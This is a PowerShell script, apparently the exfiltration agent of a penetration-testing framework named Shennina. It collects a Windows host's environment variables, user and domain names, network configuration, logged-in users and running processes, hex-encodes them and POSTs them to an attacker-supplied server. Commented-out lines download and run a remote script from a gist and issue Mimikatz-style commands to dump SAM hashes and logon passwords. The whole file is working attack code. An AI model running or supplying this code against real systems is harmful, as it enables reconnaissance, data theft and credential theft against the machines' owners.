function hexe($a) {
  $b = $a.ToCharArray();
  Foreach ($element in $b) {
    $c = $c + [System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element))
  }
  $c =  $c.replace("DA", "0A")
  return $c
}


function Invoke-Shennina-Exfiltration-Agent() {
  $url = "http://" + $Args[0] + "/data/" + $Args[1]
  Write-Output $url
  $build = ""
  $build += "env=" + (hexe(Get-ChildItem Env: | out-string))
  $build += "&Username=" + (hexe($Env:USERNAME))
  $build +=  "&COMPUTERNAME=" + (hexe($Env:COMPUTERNAME))
  $build += "&LOGONSERVER=" + (hexe($Env:LOGONSERVER))
  $build += "&USERPROFILE=" + (hexe($Env:USERPROFILE))
  $build += "&USERDOMAIN=" + (hexe($Env:USERDOMAIN))
  $build += "&USERNAME=" + (hexe($Env:USERNAME))
  $build += "&Path=" + (hexe($Env:Path))
  $build += "&ipconfig=" + (hexe(ipconfig /all | out-string))
  $build += "&logged_in_users=" + (hexe(Get-WMIObject -class Win32_ComputerSystem | select username | out-string))
  $build += "&running_processes=" + (hexe(Get-Process | out-string))
  # IEX (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/mazen160/9ea546ab11399071dcdaa5a870156a63/raw/f2b3a0924bebefb27625eafa258f0448b9ad8da6/Invoke-WindowsMaybe.ps1");
  # $CREDSDUMP = Invoke-WindowsMaybe -Command "privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit"
  # $build += "&CredsDump=" + (hexe($CREDSDUMP | out-string))
  $data = $build
  $timeout = 100 * 1000
  $buffer = [System.Text.Encoding]::UTF8.GetBytes($data)
  [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url)
  $webRequest.Timeout = $timeout
  $webRequest.Method = "POST"
  $webRequest.ContentType = "application/x-www-form-urlencoded"
  $webRequest.ContentLength = $buffer.Length;

  $requestStream = $webRequest.GetRequestStream()
  $requestStream.Write($buffer, 0, $buffer.Length)
  $requestStream.Flush()
  $requestStream.Close()

  [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
  $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
  $streamReader.ReadToEnd()
}
